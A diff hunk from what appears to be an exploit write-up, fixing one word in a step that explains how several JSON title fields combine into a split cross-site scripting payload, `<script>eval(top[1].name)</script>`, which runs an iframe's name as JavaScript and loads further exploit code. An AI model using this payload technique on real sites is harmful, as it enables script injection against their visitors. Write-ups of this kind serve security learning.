@@ -179,7 +179,7 @@ When someone visits this page, what will happen is:
 {"success":true,"data":{"title":"<script>/*","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"*/eval(/*","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"*/top[1]/*","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"*/.name)//","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"</script>","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}
 ```
 
-5. This, of course, translated to `<script>eval(top[1].name)</script>`, meaning that we are executing the iframe name as Javascript
+5. This, of course, translates to `<script>eval(top[1].name)</script>`, meaning that we are executing the iframe name as Javascript
 6. For our own convenience, the Javascript code hidden in the iframe name just loads another javascript file where we can easily develop our real exploit logic
 
 #### 3. The Real Exploit Logic
